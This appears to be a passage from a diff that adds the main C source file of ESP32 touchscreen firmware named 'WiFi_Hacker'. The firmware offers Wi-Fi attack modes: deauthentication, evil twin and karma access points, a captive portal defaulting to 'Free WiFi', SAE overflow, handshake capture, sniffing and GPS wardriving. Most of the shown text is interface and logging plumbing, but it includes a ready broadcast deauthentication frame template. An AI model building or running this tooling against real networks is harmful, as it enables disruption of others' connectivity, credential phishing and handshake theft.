@@ -1,0 +1,5175 @@
+#include <stdio.h>
+#include "lvgl.h"
+#include "esp_lcd_panel_io.h"
+#include "esp_lcd_panel_vendor.h"
+#include "esp_lcd_panel_ops.h"
+#include "esp_lcd_ili9341.h"
+#include "ft6336.h"
+#include "driver/spi_master.h"
+#include "driver/i2c.h"
+#include "freertos/FreeRTOS.h"
+#include "freertos/task.h"
+#include "freertos/queue.h"
+#include "esp_timer.h"
+#include "esp_log.h"
+#include "esp_heap_caps.h"
+#include <string.h>
+#include <stdarg.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include "esp_event.h"
+#include "freertos/semphr.h"
+#include "wifi_cli.h"
+#include "wifi_scanner.h"
+#include "wifi_sniffer.h"
+#include "wifi_attacks.h"
+#include "wifi_wardrive.h"
+#include "attack_handshake.h"
+#include "lvgl_memory.h"
+#include <sys/unistd.h>
+#include <sys/reent.h>
+#include <dirent.h>
+#include <sys/stat.h>
+#include "esp_rom_sys.h"
+#include "esp_task_wdt.h"
+
+// GPS
+#include "driver/uart.h"
+
+#define TAG "WiFi_Hacker"
+
+// Pin configuration
+#define LCD_MOSI 24
+#define LCD_MISO 4
+#define LCD_CLK  23
+#define LCD_CS   6//13//15
+#define LCD_DC   3
+#define LCD_RST  2  
+
+// Capacitive touch I2C pins (FT6336U)
+#define CTP_SDA  9
+#define CTP_SCL  10
+#define CTP_INT  25
+#define CTP_RST  8
+
+#define LCD_H_RES 480
+#define LCD_V_RES 320
+#define LCD_HOST SPI2_HOST
+
+typedef int (*vprintf_like_t)(const char *, va_list);
+
+static lv_disp_draw_buf_t draw_buf;
+static lv_color_t *buf1 = NULL;
+static lv_color_t *buf2 = NULL;
+static SemaphoreHandle_t lvgl_mutex = NULL;
+SemaphoreHandle_t sd_spi_mutex = NULL;  // Mutex for SD/SPI access (shared with display) - used by attack_handshake.c
+static volatile bool touch_pressed_flag = false;
+static volatile uint16_t touch_x_flag = 0;
+static volatile uint16_t touch_y_flag = 0;
+static volatile bool show_touch_dot = true;
+static volatile bool ui_locked = false;
+static volatile bool nav_to_menu_flag = false;
+
+static esp_lcd_panel_handle_t panel_handle;
+static ft6336_handle_t touch_handle;
+static lv_obj_t *root_page;
+static lv_obj_t *touch_dot;  // DEBUG: visual touch indicator
+static lv_obj_t *menu_obj;
+static lv_obj_t *title_bar;
+static lv_obj_t *function_page = NULL;
+
+// Use GPS definitions from wifi_common.h via wifi_cli.h
+static gps_data_t current_gps = {0};
+static char gps_rx_buffer[GPS_BUF_SIZE];
+static StaticTask_t gps_task_buffer;
+static StackType_t *gps_task_stack = NULL;
+
+// SD init task buffers
+static StaticTask_t sd_init_task_buffer;
+static StackType_t *sd_init_task_stack = NULL;
+
+static esp_err_t init_gps_uart(void);
+static bool parse_gps_nmea(const char *nmea_sentence);
+static void gps_task(void *arg);
+
+// Route ESP logging directly to ROM UART to avoid VFS write paths during GUI/ISR contexts
+static int rom_vprintf(const char *fmt, va_list ap)
+{
+	char buf[256];
+	int len = vsnprintf(buf, sizeof(buf), fmt, ap);
+	if (len > 0) {
+		if (len < (int)sizeof(buf)) {
+			esp_rom_printf("%s", buf);
+		} else {
+			// Truncate safely to avoid heap/VFS usage
+			esp_rom_printf("%.*s", (int)sizeof(buf) - 1, buf);
+		}
+	}
+	return len;
+}
+
+// Scanner UI state
+static volatile bool scan_done_ui_flag = false;
+#define SCAN_RESULTS_MAX_DISPLAY 32
+
+// Whitelist for BSSID protection
+#define MAX_WHITELISTED_BSSIDS 150
+typedef struct {
+    uint8_t bssid[6];
+} whitelisted_bssid_t;
+whitelisted_bssid_t whiteListedBssids[MAX_WHITELISTED_BSSIDS];
+int whitelistedBssidsCount = 0;
+
+static lv_obj_t *scan_status_label = NULL;
+static lv_obj_t *scan_list = NULL;
+static lv_obj_t *deauth_list = NULL;
+static lv_obj_t *deauth_prompt_label = NULL;
+static lv_obj_t *deauth_fps_label = NULL;
+static lv_obj_t *deauth_pause_btn = NULL;
+static lv_obj_t *deauth_quit_btn = NULL;
+static volatile bool deauth_stop_flag = false;
+static volatile bool deauth_resume_flag = false;
+static volatile bool deauth_paused = false;
+static volatile uint32_t lvgl_flush_counter = 0;
+
+static lv_obj_t *evil_twin_network_dd = NULL;
+static lv_obj_t *evil_twin_html_dd = NULL;
+static lv_obj_t *evil_twin_start_btn = NULL;
+static lv_obj_t *evil_twin_status_label = NULL;
+static lv_obj_t *evil_twin_log_ta = NULL;
+static lv_obj_t *evil_twin_content = NULL;
+static int evil_twin_network_map[SCAN_RESULTS_MAX_DISPLAY];
+static int evil_twin_network_count = 0;
+static int evil_twin_html_map[SCAN_RESULTS_MAX_DISPLAY];
+static int evil_twin_html_count = 0;
+
+typedef struct {
+    char text[160];
+} evil_log_msg_t;
+
+static QueueHandle_t evil_twin_log_queue = NULL;
+static bool evil_twin_log_capture_enabled = false;
+static vprintf_like_t previous_vprintf = NULL;
+
+// Blackout UI state
+static lv_obj_t *blackout_log_ta = NULL;
+static lv_obj_t *blackout_stop_btn = NULL;
+static QueueHandle_t blackout_log_queue = NULL;
+static bool blackout_log_capture_enabled = false;
+static volatile bool blackout_ui_active = false;
+
+// Snifferdog UI state
+static lv_obj_t *snifferdog_log_ta = NULL;
+static lv_obj_t *snifferdog_stop_btn = NULL;
+static QueueHandle_t snifferdog_log_queue = NULL;
+static bool snifferdog_log_capture_enabled = false;
+static volatile bool snifferdog_ui_active = false;
+
+// Snifferdog attack state (from original project)
+static TaskHandle_t sniffer_dog_task_handle = NULL;
+static StaticTask_t sniffer_dog_task_buffer;
+static StackType_t *sniffer_dog_task_stack = NULL;
+static volatile bool sniffer_dog_active = false;
+static int sniffer_dog_current_channel = 1;
+static int sniffer_dog_channel_index = 0;
+static int64_t sniffer_dog_last_channel_hop = 0;
+static const int sniffer_channel_hop_delay_ms = 250;
+
+// Sniffer UI state
+static lv_obj_t *sniffer_log_ta = NULL;
+static lv_obj_t *sniffer_stop_btn = NULL;
+static QueueHandle_t sniffer_log_queue = NULL;
+static bool sniffer_log_capture_enabled = false;
+static volatile bool sniffer_ui_active = false;
+
+// Sniffer task state
+static TaskHandle_t sniffer_task_handle = NULL;
+static StaticTask_t sniffer_task_buffer;
+static StackType_t *sniffer_task_stack = NULL;
+static volatile bool sniffer_task_active = false;
+
+// SAE Overflow UI state
+static lv_obj_t *sae_overflow_log_ta = NULL;
+static lv_obj_t *sae_overflow_stop_btn = NULL;
+static QueueHandle_t sae_overflow_log_queue = NULL;
+static bool sae_overflow_log_capture_enabled = false;
+static volatile bool sae_overflow_ui_active = false;
+
+// Handshake UI state
+static lv_obj_t *handshake_log_ta = NULL;
+static lv_obj_t *handshake_stop_btn = NULL;
+static QueueHandle_t handshake_log_queue = NULL;
+static bool handshake_log_capture_enabled = false;
+static volatile bool handshake_ui_active = false;
+
+// Handshake attack state
+static TaskHandle_t handshake_attack_task_handle = NULL;
+static StaticTask_t handshake_attack_task_buffer;
+static StackType_t *handshake_attack_task_stack = NULL;
+static volatile bool handshake_attack_active = false;
+static bool handshake_selected_mode = false;
+static wifi_ap_record_t handshake_targets[MAX_AP_CNT];
+static int handshake_target_count = 0;
+static bool handshake_captured[MAX_AP_CNT];
+static int handshake_current_index = 0;
+
+// Wardrive UI state
+static lv_obj_t *wardrive_log_ta = NULL;
+static lv_obj_t *wardrive_stop_btn = NULL;
+static QueueHandle_t wardrive_log_queue = NULL;
+static bool wardrive_log_capture_enabled = false;
+static volatile bool wardrive_ui_active = false;
+
+// Wardrive attack state (from original project)
+static TaskHandle_t wardrive_task_handle = NULL;
+static StaticTask_t wardrive_task_buffer;
+static StackType_t *wardrive_task_stack = NULL;
+static volatile bool wardrive_active = false;
+static int wardrive_file_counter = 1;
+
+// Wardrive buffers (static to avoid stack overflow)
+static char wardrive_gps_buffer[GPS_BUF_SIZE];
+static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];
+
+// Karma UI state
+static lv_obj_t *karma_log_ta = NULL;
+static lv_obj_t *karma_stop_btn = NULL;
+static lv_obj_t *karma_content = NULL;
+static lv_obj_t *karma_probe_dd = NULL;
+static lv_obj_t *karma_html_dd = NULL;
+static lv_obj_t *karma_start_btn = NULL;
+static QueueHandle_t karma_log_queue = NULL;
+static bool karma_log_capture_enabled = false;
+static volatile bool karma_ui_active = false;
+
+// Portal UI state
+static lv_obj_t *portal_content = NULL;
+static lv_obj_t *portal_ssid_ta = NULL;
+static lv_obj_t *portal_html_dd = NULL;
+static lv_obj_t *portal_start_btn = NULL;
+static lv_obj_t *portal_keyboard = NULL;
+static char portal_ssid_buffer[33] = "Free WiFi";
+
+// Dual-band channel list (2.4GHz + 5GHz)
+static const int dual_band_channels[] = {
+    // 2.4GHz channels
+    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
+    // 5GHz channels
+    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
+    132, 136, 140, 144, 149, 153, 157, 161, 165
+};
+static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);
+
+// Promiscuous filter
+static const wifi_promiscuous_filter_t sniffer_filter = {
+    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+};
+
+// Deauth frame template
+static const uint8_t deauth_frame_default[] = {
+    0xC0, 0x00,                         // Type/Subtype: Deauthentication
+    0x00, 0x00,                         // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast MAC
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Sender (BSSID AP)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID AP
+    0x00, 0x00,                         // Seq Control
+    0x01, 0x00                          // Reason: Unspecified
+};
+
+static void scan_checkbox_event_cb(lv_event_t *e);
+void lvgl_flush_cb(lv_disp_drv_t *drv, const lv_area_t *area, lv_color_t *color_p);
+void lvgl_touch_read_cb(lv_indev_drv_t *indev_drv, lv_indev_data_t *data);
+void attack_event_cb(lv_event_t *e);
+void menu_event_cb(lv_event_t *e);
+lv_obj_t *create_menu_item(lv_obj_t *parent, const char *icon, const char *text);
+lv_obj_t *create_clickable_item(lv_obj_t *parent, const char *icon, const char *text, lv_event_cb_t callback, const char *user_data);
+void show_function_page(const char *name);
+void show_menu(void);
+void back_to_menu_cb(lv_event_t *e);
+static void deauth_pause_event_cb(lv_event_t *e);
+static void deauth_quit_event_cb(lv_event_t *e);
+
+static void create_function_page_base(const char *name);
+void show_function_page(const char *name);
+static void show_evil_twin_page(void);
+static void evil_twin_start_btn_cb(lv_event_t *e);
+static esp_err_t evil_twin_enable_log_capture(void);
+static void evil_twin_disable_log_capture(void);
+static void blackout_yes_btn_cb(lv_event_t *e);
+static void blackout_stop_btn_cb(lv_event_t *e);
+static esp_err_t blackout_enable_log_capture(void);
+static void blackout_disable_log_capture(void);
+static void snifferdog_yes_btn_cb(lv_event_t *e);
+static void snifferdog_stop_btn_cb(lv_event_t *e);
+static esp_err_t snifferdog_enable_log_capture(void);
+static void snifferdog_disable_log_capture(void);
+static void sniffer_yes_btn_cb(lv_event_t *e);
+static void sniffer_enough_btn_cb(lv_event_t *e);
+static esp_err_t sniffer_enable_log_capture(void);
+static void sniffer_disable_log_capture(void);
+static void sniffer_task(void *pvParameters);
+static void sae_overflow_yes_btn_cb(lv_event_t *e);
+static void sae_overflow_stop_btn_cb(lv_event_t *e);
+static esp_err_t sae_overflow_enable_log_capture(void);
+static void sae_overflow_disable_log_capture(void);
+static void handshake_yes_btn_cb(lv_event_t *e);
+static void handshake_stop_btn_cb(lv_event_t *e);
+static esp_err_t handshake_enable_log_capture(void);
+static void handshake_disable_log_capture(void);
+static void handshake_attack_task(void *pvParameters);
+static void attack_network_with_burst(const wifi_ap_record_t *ap);
+static bool check_handshake_file_exists(const char *ssid);
+static void handshake_cleanup(void);
+static void sniffer_dog_channel_hop(void);
+static void sniffer_dog_task(void *pvParameters);
+static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
+static void wardrive_start_btn_cb(lv_event_t *e);
+static void wardrive_stop_btn_cb(lv_event_t *e);
+static esp_err_t wardrive_enable_log_capture(void);
+static void wardrive_disable_log_capture(void);
+static void wardrive_task(void *pvParameters);
+static void show_karma_page(void);
+static void karma_start_btn_cb(lv_event_t *e);
+static void karma_stop_btn_cb(lv_event_t *e);
+static esp_err_t karma_enable_log_capture(void);
+static void karma_disable_log_capture(void);
+static void show_portal_page(void);
+static void portal_ssid_ta_event_cb(lv_event_t *e);
+static void portal_keyboard_event_cb(lv_event_t *e);
+static void portal_start_btn_cb(lv_event_t *e);
+static void portal_keyboard_event_cb(lv_event_t *e);
+static void get_timestamp_string(char* buffer, size_t size);
+static const char* get_auth_mode_wiggle(wifi_auth_mode_t mode);
+static bool wait_for_gps_fix(int timeout_seconds);
+void load_whitelist_from_sd(void);
+bool is_bssid_whitelisted(const uint8_t *bssid);
+static void wifi_scan_done_cb(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
+{
+    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_SCAN_DONE) {
+        scan_done_ui_flag = true;
+    }
+}
+
+static void scan_checkbox_event_cb(lv_event_t *e)
+{
+    lv_obj_t *cb = lv_event_get_target(e);
+    int index = (int)(intptr_t)lv_event_get_user_data(e);
+    bool checked = lv_obj_has_state(cb, LV_STATE_CHECKED);
+    wifi_scanner_select_network(index, checked);
+}
+
+static int dual_vprintf(const char *fmt, va_list ap)
+{
+    va_list ap_copy, ap_copy2, ap_copy3, ap_copy4, ap_copy5, ap_copy6, ap_copy7;
+    va_copy(ap_copy, ap);
+    va_copy(ap_copy2, ap);
+    va_copy(ap_copy3, ap);
+    va_copy(ap_copy4, ap);
+    va_copy(ap_copy5, ap);
+    va_copy(ap_copy6, ap);
+    va_copy(ap_copy7, ap);
+
+    int ret = rom_vprintf(fmt, ap);
+
+    if (evil_twin_log_capture_enabled && evil_twin_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            if (strstr(msg.text, "wifi_attacks:") != NULL) {
+                xQueueSend(evil_twin_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (blackout_log_capture_enabled && blackout_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy2);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            if (strstr(msg.text, "wifi_attacks:") != NULL) {
+                xQueueSend(blackout_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (snifferdog_log_capture_enabled && snifferdog_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy3);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            // Capture logs with TAG (WiFi_Hacker) that contain SnifferDog
+            if (strstr(msg.text, "WiFi_Hacker:") != NULL && strstr(msg.text, "SnifferDog") != NULL) {
+                xQueueSend(snifferdog_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (sniffer_log_capture_enabled && sniffer_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy6);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            // Capture logs with TAG (wifi_sniffer)
+            if (strstr(msg.text, "wifi_sniffer:") != NULL) {
+                xQueueSend(sniffer_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (sae_overflow_log_capture_enabled && sae_overflow_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy4);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            if (strstr(msg.text, "wifi_attacks:") != NULL) {
+                xQueueSend(sae_overflow_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (handshake_log_capture_enabled && handshake_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy5);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            // Capture logs from handshake attack task (WiFi_Hacker tag, but not SnifferDog)
+            // Also capture logs from attack_handshake component
+            if ((strstr(msg.text, "WiFi_Hacker:") != NULL && strstr(msg.text, "SnifferDog") == NULL) ||
+                strstr(msg.text, "attack_handshake:") != NULL) {
+                xQueueSend(handshake_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (wardrive_log_capture_enabled && wardrive_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy5);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            // Capture logs with TAG (WiFi_Hacker) for Wardrive
+            if (strstr(msg.text, "WiFi_Hacker:") != NULL) {
+                xQueueSend(wardrive_log_queue, &msg, 0);
+            }
+        }
+    }
+
+    if (karma_log_capture_enabled && karma_log_queue) {
+        evil_log_msg_t msg;
+        int written = vsnprintf(msg.text, sizeof(msg.text), fmt, ap_copy7);
+        if (written > 0) {
+            msg.text[sizeof(msg.text) - 1] = '\0';
+            if (strstr(msg.text, "wifi_attacks:") != NULL) {
+                xQueueSend(karma_log_queue, &msg, 0);
+            }
+        }
+    }
+    va_end(ap_copy4);
+    va_end(ap_copy5);
+    va_end(ap_copy6);
+    va_end(ap_copy7);
+
+    va_end(ap_copy);
+    va_end(ap_copy2);
+    va_end(ap_copy3);
+    return ret;
+}
+
+static esp_err_t evil_twin_enable_log_capture(void)
+{
+    if (!evil_twin_log_queue) {
+        evil_twin_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!evil_twin_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(evil_twin_log_queue);
+    }
+
+    if (!evil_twin_log_capture_enabled) {
+        if (!blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        evil_twin_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void evil_twin_disable_log_capture(void)
+{
+    if (evil_twin_log_capture_enabled) {
+        evil_twin_log_capture_enabled = false;
+        if (!blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+        esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+        previous_vprintf = NULL;
+        }
+    }
+
+    if (evil_twin_log_queue) {
+        xQueueReset(evil_twin_log_queue);
+    }
+}
+
+static esp_err_t blackout_enable_log_capture(void)
+{
+    if (!blackout_log_queue) {
+        blackout_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!blackout_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(blackout_log_queue);
+    }
+
+    if (!blackout_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        blackout_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void blackout_disable_log_capture(void)
+{
+    if (blackout_log_capture_enabled) {
+        blackout_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (blackout_log_queue) {
+        xQueueReset(blackout_log_queue);
+    }
+}
+
+static esp_err_t snifferdog_enable_log_capture(void)
+{
+    if (!snifferdog_log_queue) {
+        snifferdog_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!snifferdog_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(snifferdog_log_queue);
+    }
+
+    if (!snifferdog_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        snifferdog_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void snifferdog_disable_log_capture(void)
+{
+    if (snifferdog_log_capture_enabled) {
+        snifferdog_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (snifferdog_log_queue) {
+        xQueueReset(snifferdog_log_queue);
+    }
+}
+
+static esp_err_t sniffer_enable_log_capture(void)
+{
+    if (!sniffer_log_queue) {
+        sniffer_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!sniffer_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(sniffer_log_queue);
+    }
+
+    if (!sniffer_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        sniffer_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void sniffer_disable_log_capture(void)
+{
+    if (sniffer_log_capture_enabled) {
+        sniffer_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (sniffer_log_queue) {
+        xQueueReset(sniffer_log_queue);
+    }
+}
+
+static esp_err_t sae_overflow_enable_log_capture(void)
+{
+    if (!sae_overflow_log_queue) {
+        sae_overflow_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!sae_overflow_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(sae_overflow_log_queue);
+    }
+
+    if (!sae_overflow_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        sae_overflow_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void sae_overflow_disable_log_capture(void)
+{
+    if (sae_overflow_log_capture_enabled) {
+        sae_overflow_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled && !handshake_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (sae_overflow_log_queue) {
+        xQueueReset(sae_overflow_log_queue);
+    }
+}
+
+static esp_err_t handshake_enable_log_capture(void)
+{
+    if (handshake_log_queue == NULL) {
+        handshake_log_queue = xQueueCreate(20, sizeof(evil_log_msg_t));
+        if (handshake_log_queue == NULL) {
+            return ESP_FAIL;
+        }
+    }
+
+    if (!handshake_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        handshake_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void handshake_disable_log_capture(void)
+{
+    if (handshake_log_capture_enabled) {
+        handshake_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !wardrive_log_capture_enabled && !karma_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (handshake_log_queue) {
+        xQueueReset(handshake_log_queue);
+    }
+}
+
+static esp_err_t wardrive_enable_log_capture(void)
+{
+    if (!wardrive_log_queue) {
+        wardrive_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!wardrive_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(wardrive_log_queue);
+    }
+
+    if (!wardrive_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !karma_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        wardrive_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void wardrive_disable_log_capture(void)
+{
+    if (wardrive_log_capture_enabled) {
+        wardrive_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !karma_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (wardrive_log_queue) {
+        xQueueReset(wardrive_log_queue);
+    }
+}
+
+static esp_err_t karma_enable_log_capture(void)
+{
+    if (!karma_log_queue) {
+        karma_log_queue = xQueueCreate(32, sizeof(evil_log_msg_t));
+        if (!karma_log_queue) {
+            return ESP_ERR_NO_MEM;
+        }
+    } else {
+        xQueueReset(karma_log_queue);
+    }
+
+    if (!karma_log_capture_enabled) {
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled) {
+            previous_vprintf = esp_log_set_vprintf(dual_vprintf);
+        }
+        karma_log_capture_enabled = true;
+    }
+
+    return ESP_OK;
+}
+
+static void karma_disable_log_capture(void)
+{
+    if (karma_log_capture_enabled) {
+        karma_log_capture_enabled = false;
+        if (!evil_twin_log_capture_enabled && !blackout_log_capture_enabled && !snifferdog_log_capture_enabled && !sniffer_log_capture_enabled && !sae_overflow_log_capture_enabled && !handshake_log_capture_enabled && !wardrive_log_capture_enabled) {
+            esp_log_set_vprintf(previous_vprintf ? previous_vprintf : rom_vprintf);
+            previous_vprintf = NULL;
+        }
+    }
+
+    if (karma_log_queue) {
+        xQueueReset(karma_log_queue);
+    }
+}
+
+void lvgl_tick_task(void *arg)
+{
+    lv_tick_inc(10);
+}
+
+// Forward declarations
+void print_memory_stats(void);
+
+// Helper function to check heap integrity with detailed logging
+static void check_heap_integrity(const char* location) {
+    bool is_ok = heap_caps_check_integrity_all(true);
+    if (!is_ok) { 
+        ESP_LOGE(TAG, "[HEAP CHECK] ❌ CORRUPTION DETECTED at: %s", location);
+    } else {
+        ESP_LOGE(TAG, "[HEAP CHECK] ✅ Heap integrity OK at: %s", location);
+    }
+}
+
+static void init_display(void)
+{    
+    spi_bus_config_t buscfg = {
+        .mosi_io_num = LCD_MOSI,
+        .miso_io_num = LCD_MISO,
+        .sclk_io_num = LCD_CLK,
+        .quadwp_io_num = -1,
+        .quadhd_io_num = -1,
+        .max_transfer_sz = LCD_H_RES * 64 * sizeof(uint16_t),  // 64 lines instead of full screen (60KB vs 300KB)
+    };
+    
+    ESP_ERROR_CHECK(spi_bus_initialize(LCD_HOST, &buscfg, SPI_DMA_CH_AUTO));
+    esp_lcd_panel_io_handle_t io_handle;
+    esp_lcd_panel_io_spi_config_t io_config = {
+        .dc_gpio_num = LCD_DC,
+        .cs_gpio_num = LCD_CS,
+        .pclk_hz = 40 * 1000 * 1000,  // Push to 60MHz - ILI9341 can handle up to 80MHz
+        .lcd_cmd_bits = 8,
+        .lcd_param_bits = 8,
+        .spi_mode = 0,
+        .trans_queue_depth = 10,
+        .flags = {
+            .dc_low_on_data = 0,
+            .lsb_first = 0,
+        },
+    };
+
+    // Memory barrier and heap validation BEFORE
+    asm volatile("fence" ::: "memory");
+    
+    //check_heap_integrity("Before susp step 4b");
+    //print_memory_stats();
+    
+    ESP_ERROR_CHECK(esp_lcd_new_panel_io_spi(LCD_HOST, &io_config, &io_handle));
+    
+    // Memory barrier and heap validation AFTER
+    asm volatile("fence" ::: "memory");
+
+    //check_heap_integrity("After susp step 4b");
